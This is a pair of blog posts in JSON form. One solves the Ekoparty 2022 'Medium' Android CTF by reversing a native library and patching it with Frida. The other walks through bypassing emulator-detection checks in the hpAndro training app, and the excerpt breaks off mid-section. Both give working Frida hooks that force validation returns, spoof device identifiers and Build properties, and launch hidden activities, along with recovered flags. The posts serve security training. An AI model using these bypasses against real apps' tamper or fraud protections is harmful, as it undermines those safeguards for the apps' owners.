[{"categories":["Misc","CTF"],"contents":"In this post I will solve the challenge called Medium, created for the Ekoparty 2022 - Mobile Hacking Space CTF. The challenge can be found in the following repo.\nmedium.apk\nI will devide the blogpost in different sections so you can decide which part to read and maybe jump to a section you are interested in.\nRecon of application Reverse Engineering application - Java Layer Reverse Engineering application - Native Layer Fixing application with Frida Recon of application The first thing I usually do whenever I have a CTF challenge is installing the file in a phone or emulator and run it. In this case whenever I did it I had a crash. Apparently the application was not meant to be run or it was somehow broken and we had to fix it. In order to discard an environment issue I decompiled the application and checked if the application was built with any particular native library that was crashing in my emulator. In order to do that I decompiled the application with unzip and checked the folder /lib in order to see if there was any library and which CPU architecture was it compatible with. I found the following folders:\nlib/arm64-v8a/libmedium.so lib/armeabi-v7a/libmedium.so lib/x86/libmedium.so lib/x86_64/libmedium.so So the application could be run almost in any device or emulator. The alternative in this case was probably that the application was broken and maybe the solution must come from a fix on the app or from a reverse engineering approach.\nReverse Engineering application - Java Layer The next step was opening the application with jadx-gui and checking the content and the logic inside. The first thing to check was the strings.xml file which sometimes have some content or clue about what should be done. I found the following content:\n\u0026lt;resources\u0026gt; ... \u0026lt;string name=\u0026#34;the_key\u0026#34;\u0026gt;a7rrg10/97BjqVgKu+eU\u0026lt;/string\u0026gt; \u0026lt;/resources\u0026gt; Based on the description it could be the encrypted flag or a key to decrypt the flag. I had to look for another value or understand in the application how the_key could be used. In order to do that I decided check the Java layer in order to find out more information.\nIn the application we had only five classes created in the package com.mhs.medium:\nMainActivity: which is the activity launched when the application is started SupportOne: which has one method to encrypt a char array and another to decrypt it. The decryptCipher method is interesting because it gets only one parameter, which matches the the_key content. SupportTwo: which has another method related to encrypt and decrypt which receives only one parameter. SupportThree: which is an interface to the libmedium.so libray I found in the first recon. SupportFour: which has methods that picks some values from an array static value. At that point the class seemed to be useless. After the first overview of the source code we seemed to have three potential candidates in order to solve the challenge. As the SupportOne and SupportTwo classes had simple methods we could try them by creating a class in java and using the the_key to see if any of them works:\npublic class Main { //Content from SupportOne static int a = 17; static int b = 20; static String decryptCipherSupportOne(String str) { int i = 0; for (int i2 = 0; i2 \u0026lt; 26; i2++) { if ((a * i2) % 26 == 1) { i = i2; } } String str2 = \u0026#34;\u0026#34;; for (int i3 = 0; i3 \u0026lt; str.length(); i3++) { if (str.charAt(i3) != \u0026#39; \u0026#39;) { str2 = str2 + ((char) (((((str.charAt(i3) + \u0026#39;A\u0026#39;) - b) * i) % 26) + 65)); } else { str2 = str2 + str.charAt(i3); } } return str2; } //Content from SupportTwo static String decryptMessageSupportTwo(char[] cArr) { char[] cArr2 = new char[cArr.length / 2]; for (int i = 0; i \u0026lt; cArr.length / 2; i += 2) { cArr2[i / 2] = cArr[i]; } return new String(cArr2); } public static void main(String[] args) { String the_key = \u0026#34;a7rrg10/97BjqVgKu+eU\u0026#34;; System.out.println(\u0026#34;Return of SupportOne: \u0026#34; + decryptCipherSupportOne(the_key)); System.out.println(\u0026#34;Return of SupportTwo: \u0026#34; + decryptMessageSupportTwo(the_key.toCharArray())); } } The result of executing the code is:\nReturn of SupportOne: QMRRYEHKGMFPUXYEIWEA Return of SupportTwo: arg09 Even when it made sense, the keys didn\u0026rsquo;t work whenever I used them on the CTFd platform. So I discarded those two classes and went for the option of SupportThree, which had a native library.\nReverse Engineering application - Native Layer After discarding the two options I followed with the analysis of the SupportThree class. This one required us to reverse engineer the libmedium.so library. If you do not know how to do it I created a small video explaining what is JNI and how to reverse engineer the library with Ghidra: https://www.youtube.com/watch?v=wZC7Pzm3jRA\u0026amp;ab_channel=AgeOfEntropy\nWe see in the MainActivity the following code that gives us a clue about how to call the methods of the native interface:\nprotected void onCreate(Bundle bundle) { super.onCreate(bundle); setContentView(R.layout.activity_main); SupportTwo.encryptMessage(SupportOne.encryptMessage(\u0026#34;aguante_el_paco\u0026#34;.toCharArray()).toCharArray()); String finalEncrypt = SupportThree.finalEncrypt(getApplicationContext(), Base64.encodeToString(\u0026#34;test_it\u0026#34;.getBytes(), 0)); Log.i(\u0026#34;ENCRYPT\u0026#34;, finalEncrypt); Log.i(\u0026#34;ENCRYPT\u0026#34;, new String(Base64.decode(SupportThree.finalEncrypt(getApplicationContext(), finalEncrypt).getBytes(), 0))); } This class calls two methods. The first one is encryptMessage which receives a char array and the second one is finalEncrypt which receives a Base64 encoded String. If you paid attention to the the_key value it seems to be a Base64 encoded String, so without going any further on the decryption I suspect the candidate for the solution is in it.\nSo in Ghidra I had to check the following method: Java_com_mhs_medium_SupportThree_finalEncrypt (the finalEncrypt method from com.medium.SupportThree class) after importing the jni header in the project and changing the types of the method from the following ones:\nundefined8 Java_com_mhs_medium_SupportThree_finalEncrypt (long *param_1,undefined8 param_2,_jmethodID *param_3,undefined8 param_4) to:\njstring Java_com_mhs_medium_SupportThree_finalEncrypt (JNIEnv *env,jclass supprtThreeClass,jobject context,jstring message) The first two parameters are the ones that any JNI methods receives from Java when a static method is being called, which are a pointer to JNIEnv (which is used to call methods, classes from the JVM environment) and the jclass (which is the representation of the SupportThree class in the scope of the native library). The other parameters, if any, depend on the specification of the method defined. In this case the method receives two parameters:\npublic static native String finalEncrypt(Context context, String message); In JNI any particular instance of a class can be defined as a jobject, and in the case of the String class, it can be converted to jstring as we did in this case. The result of the pseudo-code generated in GHidra is the following one:\njstring Java_com_mhs_medium_SupportThree_finalEncrypt (JNIEnv *env,jclass supprtThreeClass,jobject context,jstring message) { int iVar1; int iVar2; jfieldID p_Var3; ulong uVar4; jobject p_Var5; jmethodID p_Var6; jsize jVar7; jclass p_Var8; jmethodID p_Var9; _jmethodID *p_Var10; jclass p_Var11; jmethodID p_Var12; jmethodID p_Var13; undefined8 uVar14; jstring p_Var15; jarray array; jarray array_00; jsize jVar16; char *__dest; jbyte *pjVar17; char *__dest_00; jbyteArray array_01; jstring unaff_x23; do { iVar1 = validation1((_JNIEnv *)env); if (iVar1 != 1) { return unaff_x23; } p_Var8 = (*(*env)-\u0026gt;GetObjectClass)(env,context); p_Var9 = (*(*env)-\u0026gt;GetMethodID) (env,p_Var8,\u0026#34;getPackageManager\u0026#34;,\u0026#34;()Landroid/content/pm/PackageManager;\u0026#34;); p_Var10 = (_jmethodID *)_JNIEnv::CallObjectMethod((_jobject *)env,(_jmethodID *)context,p_Var9); p_Var11 = (*(*env)-\u0026gt;FindClass)(env,\u0026#34;android/content/pm/PackageManager\u0026#34;); p_Var9 = (*(*env)-\u0026gt;GetMethodID) (env,p_Var11,\u0026#34;getPackageInfo\u0026#34;, \u0026#34;(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;\u0026#34;); iVar1 = validation2((_JNIEnv *)env); if (iVar1 == 1) { p_Var12 = (*(*env)-\u0026gt;GetMethodID)(env,p_Var8,\u0026#34;getPackageName\u0026#34;,\u0026#34;()Ljava/lang/String;\u0026#34;); unaff_x23 = (jstring)_JNIEnv::CallObjectMethod((_jobject *)env,(_jmethodID *)context,p_Var12); } p_Var3 = (*(*env)-\u0026gt;GetStaticFieldID)(env,p_Var11,\u0026#34;GET_SIGNATURES\u0026#34;,\u0026#34;I\u0026#34;); uVar4 = (*(*env)-\u0026gt;GetStaticIntField)(env,p_Var11,p_Var3); p_Var5 = (jobject)_JNIEnv::CallObjectMethod ((_jobject *)env,p_Var10,p_Var9,unaff_x23,uVar4 \u0026amp; 0xffffffff); p_Var8 = (*(*env)-\u0026gt;FindClass)(env,\u0026#34;android/content/pm/PackageInfo\u0026#34;); p_Var3 = (*(*env)-\u0026gt;GetFieldID)(env,p_Var8,\u0026#34;signatures\u0026#34;,\u0026#34;[Landroid/content/pm/Signature;\u0026#34;); p_Var5 = (*(*env)-\u0026gt;GetObjectField)(env,p_Var5,p_Var3); p_Var8 = (*(*env)-\u0026gt;FindClass)(env,\u0026#34;java/security/MessageDigest\u0026#34;); p_Var9 = (*(*env)-\u0026gt;GetStaticMethodID) (env,p_Var8,\u0026#34;getInstance\u0026#34;,\u0026#34;(Ljava/lang/String;)Ljava/security/MessageDigest;\u0026#34; ); p_Var12 = (*(*env)-\u0026gt;GetMethodID)(env,p_Var8,\u0026#34;update\u0026#34;,\u0026#34;([B)V\u0026#34;); p_Var6 = (*(*env)-\u0026gt;GetMethodID)(env,p_Var8,\u0026#34;digest\u0026#34;,\u0026#34;()[B\u0026#34;); jVar7 = (*(*env)-\u0026gt;GetArrayLength)(env,p_Var5); } while ((int)jVar7 \u0026lt; 1); p_Var5 = (*(*env)-\u0026gt;GetObjectArrayElement)(env,p_Var5,0); p_Var11 = (*(*env)-\u0026gt;FindClass)(env,\u0026#34;android/content/pm/Signature\u0026#34;); p_Var13 = (*(*env)-\u0026gt;GetMethodID)(env,p_Var11,\u0026#34;toByteArray\u0026#34;,\u0026#34;()[B\u0026#34;); uVar14 = _JNIEnv::CallObjectMethod((_jobject *)env,(_jmethodID *)p_Var5,p_Var13); p_Var15 = (*(*env)-\u0026gt;NewStringUTF)(env,\u0026#34;SHA\u0026#34;); p_Var10 = (_jmethodID *) _JNIEnv::CallStaticObjectMethod((_jclass *)env,(_jmethodID *)p_Var8,p_Var9,p_Var15); _JNIEnv::CallVoidMethod((_jobject *)env,p_Var10,p_Var12,uVar14); array = (jarray)_JNIEnv::CallObjectMethod((_jobject *)env,p_Var10,p_Var6); p_Var8 = (*(*env)-\u0026gt;FindClass)(env,\u0026#34;android/util/Base64\u0026#34;); p_Var9 = (*(*env)-\u0026gt;GetStaticMethodID)(env,p_Var8,\u0026#34;decode\u0026#34;,\u0026#34;(Ljava/lang/String;I)[B\u0026#34;); p_Var3 = (*(*env)-\u0026gt;GetStaticFieldID)(env,p_Var8,\u0026#34;DEFAULT\u0026#34;,\u0026#34;I\u0026#34;); uVar4 = (*(*env)-\u0026gt;GetStaticIntField)(env,p_Var8,p_Var3); array_00 = (jarray)_JNIEnv::CallStaticObjectMethod ((_jclass *)env,(_jmethodID *)p_Var8,p_Var9,message, uVar4 \u0026amp; 0xffffffff); jVar7 = (*(*env)-\u0026gt;GetArrayLength)(env,array_00); jVar16 = (*(*env)-\u0026gt;GetArrayLength)(env,array_00); iVar1 = (int)jVar16; __dest = (char *)malloc((long)(iVar1 + 1)); if ((__dest != (char *)0x0) \u0026amp;\u0026amp; (pjVar17 = (*(*env)-\u0026gt;GetByteArrayElements)(env,array_00,(jboolean *)0x0), pjVar17 != (jbyte *)0x0)) { memcpy(__dest,pjVar17,(long)iVar1); __dest[iVar1] = \u0026#39;\\0\u0026#39;; } jVar16 = (*(*env)-\u0026gt;GetArrayLength)(env,array); iVar1 = (int)jVar16; __dest_00 = (char *)malloc((long)(iVar1 + 1)); if ((__dest_00 != (char *)0x0) \u0026amp;\u0026amp; (pjVar17 = (*(*env)-\u0026gt;GetByteArrayElements)(env,array,(jboolean *)0x0), pjVar17 != (jbyte *)0x0) ) { memcpy(__dest_00,pjVar17,(long)iVar1); __dest_00[iVar1] = \u0026#39;\\0\u0026#39;; } iVar1 = isHidden; iVar2 = validation3((_JNIEnv *)env); pjVar17 = (jbyte *)encryptDecrypt(__dest,__dest_00,iVar2 + iVar1); array_01 = (*(*env)-\u0026gt;NewByteArray)(env,(jsize)jVar7); (*(*env)-\u0026gt;SetByteArrayRegion)(env,array_01,0,(jsize)jVar7,pjVar17); p_Var8 = (*(*env)-\u0026gt;FindClass)(env,\u0026#34;android/util/Base64\u0026#34;); p_Var9 = (*(*env)-\u0026gt;GetStaticMethodID)(env,p_Var8,\u0026#34;encodeToString\u0026#34;,\u0026#34;([BI)Ljava/lang/String;\u0026#34;); p_Var3 = (*(*env)-\u0026gt;GetStaticFieldID)(env,p_Var8,\u0026#34;DEFAULT\u0026#34;,\u0026#34;I\u0026#34;); uVar4 = (*(*env)-\u0026gt;GetStaticIntField)(env,p_Var8,p_Var3); p_Var15 = (jstring)_JNIEnv::CallStaticObjectMethod ((_jclass *)env,(_jmethodID *)p_Var8,p_Var9,array_01, uVar4 \u0026amp; 0xffffffff); return p_Var15; } After the change the method could be a bit simpler to understand. In this case there is a heavy use of the JNIEnv, so in order to facilitate the understanding of the code you can use the following rules:\nThe way of using the env parameter. (*(*env)-\u0026gt;GetObjectClass)(env,context); can be written a bit simpler:\nenv-\u0026gt;GetObjectClass(env,context) Calling a static method p_Var8 = (*(*env)-\u0026gt;GetObjectClass)(env,context); p_Var9 = (*(*env)-\u0026gt;GetMethodID) (env,p_Var8,\u0026#34;getPackageManager\u0026#34;,\u0026#34;()Landroid/content/pm/PackageManager;\u0026#34;); p_Var10 = (_jmethodID *)_JNIEnv::CallObjectMethod((_jobject *)env,(_jmethodID *)context,p_Var9); can be written as well as:\np_Var8 = env-\u0026gt;GetObjectClass(context); p_Var9 = env-\u0026gt;GetMethodID(p_Var8,\u0026#34;getPackageManager\u0026#34;,\u0026#34;()Landroid/content/pm/PackageManager;\u0026#34;); p_Var10 = env-\u0026gt;CallObjectMethod(context,p_Var9); which might be confusing but basically it does the following. In the line 1 it gets the class of the jobject (in this case context). Using the class as a parameter it gets a particular method using two parameters: getPackageManager and ()Landroid/content/pm/PackageManager; which is the signature of the method translated to smali. The third line calls the method with the reference to the object, the method retrieved in the second line and the parameters it receives (if any). So In Java the previous method would be something like this:\nPackageManager packageManager = context.getPackageManager(); Note: Check the logic of the data types from this post: Datatypes in smali\nIf we have patience and follow the rules we can get to the following pseudo-code in Java:\njstring Java_com_mhs_medium_SupportThree_finalEncrypt (JNIEnv *env,jclass supprtThreeClass,jobject context,jstring message) { do { //native validation1 if (validation1(env) != 1) { return unaff_x23; } PackageManager packageManager = context.getPackageManager(); //native validation2 if (validation2(env) == 1) { unaff_x23 = context.getPackageName(); } int signatureId = packageManaget.GET_SIGNATURES; PackageInfo packageInfo = packageManager.getPackageInfo(unaff_x23,signatureId); Signature[] signatures = packageInfo.signatures; } while (signatures.length() \u0026lt; 1); Signature signature = signatures[0]; byte[] signatureArray = signature.toByteArray(); byte[] mdigest = MessageDigest.getInstance(\u0026#34;SHA\u0026#34;).digest(); byte[] decodedParam = Base64.decode(message,Base64.DEFAULT); //digestC = lines that converts the digest from jbyteArray to a C array //messageC = lines that converts the message from jbyteArray to a C array //third method with static value outVal3 = validation3(env); output = encryptDecrypt(digestC,messageC,outVal3 + isHidden); return Base64.encodeToString(output,Base64.DEFAULT); } So we see three validations that might be the cause of the crash of the application and a method that decrypts/encrypts the content received in the message parameter with the message digest and a paramter that is the sum of isHidden (a parameter in the lib) plus the output of validation3.\nThen I checked the validation1 function and executed the same reverse engineering process that I did with the previous function. I discovered that the function did the following:\nvar1 = Gets SupportFour.getFirst(0) //47 var2 = Gets SupportFour.getSecond(0) //56 var3 = Gets SupportFour.getThird(0) //87 var4 = Gets SupportFour.getFourth(0) //140 Executes the following arithmetic operations: 5.1- resop1 = (var2 * var1) / var3; (int value kept) 5.2- return var2 * var1 - resop1 * var3 == var4; So after replacing the variables with the values taken from the array:\n5.1 - 56 * 47 / 87 = 30 5.2 - 56 * 47 - 30 * 87 = 2632 - 2610 = 22 != 140\nSo because the function returns 0 (false in C is represented as 0), the method gets in if statement:\nif (iVar1 != 1) { return unaff_x23; } In this case the problem is that unaff_x23 is never instantiated, so whenever Java wants to shape the content to a String (what it was expecting based on the signature of the JNI method), but the variable points to anywhere so the application crashes.\nMaking simple fixes on the binary is not possible because the method encryptDecrypt uses in some way the signature of the application to decrypt the message. Because of that changing the binary would change the signature as well (because of how the APK signatures work). So we would need to do a lot of modifications to the binary in order to hardcode the signature and then make the changes on the validations.\nAnother alternative would be to use Frida, inject dynamically the modifications on the methods, which would not ruin the signature at all because the changes are made in the memory of the process. So this seems the easiest path to follow.\nFixing application with Frida In order to inject effectively the modifications I used the early instrumentation process as the method that crashed was called when the application was started. I executed the following command:\nfrida -U -f com.mhs.medium Note that I did not use the no-pause flag in order to execute some scripts before starting the application. In this case I had to find the names of the validation1 to valitadion3 methods. In order to do so I used the following frida script in the frida-cli:\nvar exports = Process.getModuleByName(\u0026#34;libmedium.so\u0026#34;).enumerateExports() for (var i = 0; i \u0026lt; exports.length; i++) { if (exports[i].name.includes(\u0026#34;validation\u0026#34;)) { console.log(exports[i].name); } } With this approach I got an error saying that the library was not loaded. I weas shocked initially, but then I realized that as I was using early instrumentation the library might not be yet loaded in memory (because the class was not loaded yet). So this apporach would not work.\nI shifted the strategy to overwrite the method onCreate of the MainActivity to avoid the call to the method that crashes. This can be done with early instrumentation:\nJava.perform( function () { var MainClass = Java.use(\u0026#34;com.mhs.medium.MainActivity\u0026#34;); var String = Java.use(\u0026#34;java.lang.String\u0026#34;); var SupportThree = Java.use(\u0026#34;com.mhs.medium.SupportThree\u0026#34;); MainClass.onCreate.implementation = function (bundle) { this.$super.onCreate(bundle); } }); After the change when I run the script to get the names of the methods I got:\n_Z11validation3P7_JNIEnv _Z11validation2P7_JNIEnv _Z11validation1P7_JNIEnv So based on the analysis I executed on the libmedium.so we needed to get the following conditions (I leave the analysis of validation3 to you):\nvalidation1 return 1 validation2 return 1 validation3 return more than 1 Here is the script to patch the native library:\nconsole.log(1); Interceptor.attach(Module.findExportByName(\u0026#34;libmedium.so\u0026#34;,\u0026#34;_Z11validation1P7_JNIEnv\u0026#34;), { onEnter: function (args) { console.log(\u0026#34;Call validation1\u0026#34;); }, onLeave: function (retval) { retval.replace(1); } }); console.log(2); Interceptor.attach(Module.findExportByName(\u0026#34;libmedium.so\u0026#34;,\u0026#34;_Z11validation2P7_JNIEnv\u0026#34;), { onEnter: function (args) { console.log(\u0026#34;Call validation2\u0026#34;); }, onLeave: function (retval) { retval.replace(1); } }); console.log(3); Interceptor.attach(Module.findExportByName(\u0026#34;libmedium.so\u0026#34;,\u0026#34;_Z11validation3P7_JNIEnv\u0026#34;), { onEnter: function (args) { console.log(\u0026#34;Call validation3\u0026#34;); }, onLeave: function (retval) { retval.replace(2); } }); After that, the remaining thing to do is calling the method from SupportThree manually, in order to get the key decrypted:\nJava.perform( function () { Java.choose(\u0026#34;com.mhs.medium.MainActivity\u0026#34;, { onMatch: function (instance) { console.log(\u0026#34;Found instance: \u0026#34; + instance); console.log(\u0026#34;Application context: \u0026#34; + instance.getApplicationContext()); var String = Java.use(\u0026#34;java.lang.String\u0026#34;); var SupportThree = Java.use(\u0026#34;com.mhs.medium.SupportThree\u0026#34;); console.log(SupportThree.finalEncrypt(instance.getApplicationContext(), String.$new(\u0026#34;a7rrg10/97BjqVgKu+eU\u0026#34;))); }, onComplete: function () { } }); }) The method returned the value RElPJCRtdWQ0X21VZGF9 which could be Base64 decoded in order to get the value: DIO$$mud4_mUda}%, which was the right one!!\n","permalink":"https://cmrodriguez.me/blog/solving-medium/","tags":null,"title":"CTF - Solving Medium"},{"categories":["Frida","Android","CTF","Challenge","Emulation detection"],"contents":"In this series of posts I\u0026rsquo;ll be solving some persistence challenges from hpandro ctf challenges. hpAndro created an Android application with multiple vulnerabilities, following the MSTG.\nIn this series I\u0026rsquo;ll be reviewing the Emulator Detection techniques implemented in the CTF. I\u0026rsquo;ll explain how each validation is executed and how to bypass them with Frida. I\u0026rsquo;ll show generic validations that could be used in any application regardless the type or level of obfuscation it has.\nEmulation Detection techniques basically tries to find whether the application is running on an emulator by checking some properties the OS has, and comparing them with known emulation values (like generic phone numbers used by emulators or values on some system properties). In order to bypass the validations the scripts created need to intercept the functions that return the values from the phone and change them for ones that are not generic.\nNote: In order to solve the challenges in a faster are easier way, you can follow the guide from Solving CTF with Frida - Part 5.\nWe have nine different challenges related to emulation detection mechanisms:\nVirtual Phone Number validation. Device ID validation. Hardware Specifications. QEMU check. Emulator Files Check. Emulator Default IP Check. Package name Check. Debug Flag. Network Operator Name. Virtual Phone Number validation This validation is executed in the com.hpandro.androidsecurity.ui.activity.task.emulatorDetection.VirtualPhoneNumberActivity$init$2.onClick method:\npublic final void onClick(View view) { //validates Shared Preference value String string = MainApp.Companion.getSharedPrefEmulatorDetection().getString(\u0026#34;VirtualPhoneNumberStr\u0026#34;, \u0026#34;00\u0026#34;); //check is being executed here boolean checkPhoneNumber = new EmulatorDetector(this.this$0).checkPhoneNumber(); Intrinsics.checkNotNull(string); if (!StringsKt.contains$default((CharSequence) string, (CharSequence) \u0026#34;F\u0026#34;, false, 2, (Object) null) || checkPhoneNumber) { //shows error and returns ... return; } ... //retrieves virtual phone number flag VirtualPhoneNumberActivity.access$getPresenter$p(this.this$0).getEmulatorDetectFlag(\u0026#34;vpn\u0026#34;); } This method calls the EmulatorDetector.checkPhoneNumber, which gets the TelephonyManager, and gets the line number one, and then it checks if it is in a list of phone numbers recognized as emulators\u0026rsquo; ones. The phone numbers are hardcoded in the variable PHONE_NUMBERS:\npublic final boolean checkPhoneNumber() { Object systemService = this.mContext.getSystemService(\u0026#34;phone\u0026#34;); if (systemService != null) { try { String line1Number = ((TelephonyManager) systemService).getLine1Number(); for (String str : PHONE_NUMBERS) { if (StringsKt.equals(str, line1Number, true)) { log(\u0026#34; check phone number is detected\u0026#34;); return true; } } } catch (Exception unused) { log(\u0026#34;No permission to detect access of Line1Number\u0026#34;); } return false; } throw new NullPointerException(\u0026#34;null cannot be cast to non-null type android.telephony.TelephonyManager\u0026#34;); } In this case in order to bypass this control I need to change the way the TelephonyManager returns the phone number. This can be done with the following script:\nJava.perform( function () { var String = Java.use(\u0026#34;java.lang.String\u0026#34;); var TelephonyManager = Java.use(\u0026#34;android.telephony.TelephonyManager\u0026#34;); TelephonyManager.getLine1Number.overload().implementation = function () { var result = this.getLine1Number(); console.log(\u0026#34;entra a telephony manager \u0026#34; + result); //set a valid phone number return String.$new(\u0026#34;152945677\u0026#34;); } }); Device ID In this case I could not get to the activity. So I went through the source code to see if it was implemented, and found that there were all the classes needed to execute it. I then called the activity directly from Frida:\nJava.perform( function () { var Intent = Java.use(\u0026#34;android.content.Intent\u0026#34;); var String = Java.use(\u0026#34;java.lang.String\u0026#34;); var Integer = Java.use(\u0026#34;java.lang.Integer\u0026#34;); var startIntent = Intent.$new(); startIntent.setClassName(String.$new(\u0026#34;com.hpandro.androidsecurity\u0026#34;),String.$new(\u0026#34;com.hpandro.androidsecurity.ui.activity.task.emulatorDetection.DeviceIDsActivity\u0026#34;)); startIntent.setFlags(0x10000000); Java.use(\u0026#39;android.app.ActivityThread\u0026#39;).currentApplication().startActivity(startIntent); }); Whenever I did that the activity was opened, but whenever I pressed the button, nothing happened. I saw the content of the class and checked the onclickin the DeviceIDsActivity$init$2 class. In the onClick method from the DeviceIDsActivity$init$2 class I have the following code:\npublic final void onClick(View view) { String string = MainApp.Companion.getSharedPrefEmulatorDetection().getString(\u0026#34;DeviceIDsStr\u0026#34;, \u0026#34;00\u0026#34;); boolean checkImsi = new EmulatorDetector(this.this$0).checkImsi(); boolean checkDeviceId = new EmulatorDetector(this.this$0).checkDeviceId(); Intrinsics.checkNotNull(string); if (!StringsKt.contains$default((CharSequence) string, (CharSequence) \u0026#34;F\u0026#34;, false, 2, (Object) null) || (checkDeviceId \u0026amp;\u0026amp; checkImsi)) { TextView textView = (TextView) this.this$0._$_findCachedViewById(R.id.tvDetails); Intrinsics.checkNotNullExpressionValue(textView, \u0026#34;tvDetails\u0026#34;); textView.setVisibility(0); if (checkImsi) { TextView textView2 = (TextView) this.this$0._$_findCachedViewById(R.id.tvDetails); Intrinsics.checkNotNullExpressionValue(textView2, \u0026#34;tvDetails\u0026#34;); textView2.setText(this.this$0.getString(R.string.device_id) + \u0026#34; detected as\\n\\n\u0026#34; + new EmulatorDetector(this.this$0).getDetectedImsi()); } if (checkDeviceId) { TextView textView3 = (TextView) this.this$0._$_findCachedViewById(R.id.tvDetails); Intrinsics.checkNotNullExpressionValue(textView3, \u0026#34;tvDetails\u0026#34;); textView3.setText(this.this$0.getString(R.string.device_id) + \u0026#34; detected as\\n\\n\u0026#34; + new EmulatorDetector(this.this$0).getDeviceId()); return; } return; } I checked the values that the \u0026ldquo;DeviceIDsStr\u0026rdquo;, checkImsi and checkDeviceId returned to see what happens:\nJava.perform( function () { var String = Java.use(\u0026#34;java.lang.String\u0026#34;); var MainApp = Java.use(\u0026#34;com.hpandro.androidsecurity.MainApp\u0026#34;); console.log( MainApp.Companion.value.getSharedPrefEmulatorDetection().getString(String.$new(\u0026#34;DeviceIDsStr\u0026#34;), String.$new(\u0026#34;00\u0026#34;)) ); //I need to get the context to call EmulatorDetector var context = Java.use(\u0026#39;android.app.ActivityThread\u0026#39;).currentApplication().getApplicationContext(); var EmulatorDetector = Java.use(\u0026#34;com.hpandro.androidsecurity.utils.emulatorDetection.EmulatorDetector\u0026#34;); var emulatorDetector = EmulatorDetector.$new(context); console.log(emulatorDetector.checkImsi()); console.log(emulatorDetector.checkDeviceId()); }); That script returned:\n00000000000000 false false So based on the responses, what happens in the onClick method is that the app gets in the \u0026ldquo;if\u0026rdquo;, because the \u0026ldquo;DeviceIDsStr\u0026rdquo; does not have any \u0026ldquo;F\u0026rdquo; on the content, and it does not print any message because the two conditions of root detection are not fulfilled. So in this case to show the result we can change the method that validates the \u0026ldquo;F\u0026rdquo; in the Shared Preference file:\nJava.perform( function () { var StringKt = Java.use(\u0026#34;kotlin.text.StringsKt__StringsKt\u0026#34;); StringKt.contains$default.overload(\u0026#39;java.lang.CharSequence\u0026#39;, \u0026#39;java.lang.CharSequence\u0026#39;, \u0026#39;boolean\u0026#39;, \u0026#39;int\u0026#39;, \u0026#39;java.lang.Object\u0026#39;).implementation = function (charSeq, charSeq2,boolZ, intI, objO) { if (charSeq2.toString().indexOf(\u0026#34;F\u0026#34;) \u0026gt;= 0) { console.log(\u0026#34;entra\u0026#34;); return true; } return this.contains$default(charSeq, charSeq2,boolZ, intI, objO); } }); And after that I received the flag: hpandro{emudid.FNvq8tpbMtDweNn7gsgazfz5FuO5rxrg}\nIf you have an scenario where any of the two validations shown (imsi_ids and device_id) returns true, the following script can be used:\nJava.perform( function () { var String = Java.use(\u0026#34;java.lang.String\u0026#34;); var TelephonyManager = Java.use(\u0026#34;android.telephony.TelephonyManager\u0026#34;); TelephonyManager.getDeviceId.overload().implementation = function () { //set a valid device id return String.$new(\u0026#34;000000000000001\u0026#34;); } TelephonyManager.getSubscriberId.overload().implementation = function () { //set a valid suscriber id return String.$new(\u0026#34;310260000000001\u0026#34;); } }); You can change the values returned in each overloaded function to return a valid value taken from a cellphone.\nHardware Specifications In this case the values checked are the ones from the class Build. In order to bypass them we can change the values from generic ones related to the VM to valid ones from a phone, so there is no way to detect it.\nThe validation with genymotion threw three errors:\nHARDWARE: vbox86 PRODUCT: vbox86p BOARD:(has) unknown We need to patch them. We could patch all the values as well, but in this case we\u0026rsquo;ll do it just with the ones that are detected by the application:\nJava.perform( function () { var String = Java.use(\u0026#34;java.lang.String\u0026#34;); var Build = Java.use(\u0026#34;android.os.Build\u0026#34;); Build.HARDWARE.value = String.$new(\u0026#34;anything\u0026#34;); Build.PRODUCT.value = String.$new(\u0026#34;anything\u0026#34;); Build.BOARD.value = String.$new(\u0026#34;anything\u0026#34;); }); Note that for doing this, the best moment is at the start of the execution of the application with early instrumentation.\nQEMU detection This is similar to the case of DEVICEID. I could not get to the Activity, so I had to navigate with Frida to the component and then force the change of the validation of StringKt to true.\nJava.perform( function () { var Intent = Java.use(\u0026#34;android.content.Intent\u0026#34;); var String = Java.use(\u0026#34;java.lang.String\u0026#34;); var Integer = Java.use(\u0026#34;java.lang.Integer\u0026#34;); var startIntent = Intent.$new(); startIntent.setClassName(String.$new(\u0026#34;com.hpandro.androidsecurity\u0026#34;),String.$new(\u0026#34;com.hpandro.androidsecurity.ui.activity.task.emulatorDetection.QEMUDetectionActivity\u0026#34;)); startIntent.setFlags(0x10000000); Java.use(\u0026#39;android.app.ActivityThread\u0026#39;).currentApplication().startActivity(startIntent); }); This detection has multiple validations:\npublic final void onClick(View view) { String string = MainApp.Companion.getSharedPrefEmulatorDetection().getString(\u0026#34;QEMUStr\u0026#34;, \u0026#34;00\u0026#34;); boolean checkQEmuDrivers = new EmulatorDetector(this.this$0).checkQEmuDrivers(); boolean checkQEmuProps = new EmulatorDetector(this.this$0).checkQEmuProps(); boolean checkFiles = new EmulatorDetector(this.this$0).checkFiles(EmulatorDetector.Companion.getX86_FILES(), \u0026#34;X86\u0026#34;); boolean checkFiles2 = new EmulatorDetector(this.this$0).checkFiles(EmulatorDetector.Companion.getPIPES(), \u0026#34;Pipes\u0026#34;); Intrinsics.checkNotNull(string); if ((!StringsKt.contains$default((CharSequence) string, (CharSequence) \u0026#34;F\u0026#34;, false, 2, (Object) null) || (checkQEmuDrivers \u0026amp;\u0026amp; (checkQEmuProps || checkFiles))) \u0026amp;\u0026amp; checkFiles2) { //show message error } else { //retrieve the flag } } a) Check QEMU Drivers\nThis control executes the validation by opening the /proc/tty/drivers and /proc/cpuinfo files and checking in the content if they have the word goldfish on them (stored in the variable QEMU_DRIVERS):\npublic final boolean checkQEmuDrivers() { File[] fileArr = {new File(\u0026#34;/proc/tty/drivers\u0026#34;), new File(\u0026#34;/proc/cpuinfo\u0026#34;)}; for (int i = 0; i \u0026lt; 2; i++) { File file = fileArr[i]; if (file.exists() \u0026amp;\u0026amp; file.canRead()) { byte[] bArr = new byte[1024]; try { FileInputStream fileInputStream = new FileInputStream(file); fileInputStream.read(bArr); fileInputStream.close(); } catch (Exception e) { e.printStackTrace(); } String str = new String(bArr, Charsets.UTF_8); for (String str2 : QEMU_DRIVERS) { if (StringsKt.contains$default((CharSequence) str, (CharSequence) str2, false, 2, (Object) null)) { log(\u0026#34;Check QEmuDrivers is detected\u0026#34;); return true; } } continue; } } return false; } In this case I decided to modify the FileInputStream in order to avoid returning a file wih goldfish as content. Another strategy could be to change the File constructor and checking if the file being opened by the application is /proc/tty/drivers or /proc/cpuinfo. In those cases you could retrieve the content of the files returned by a real 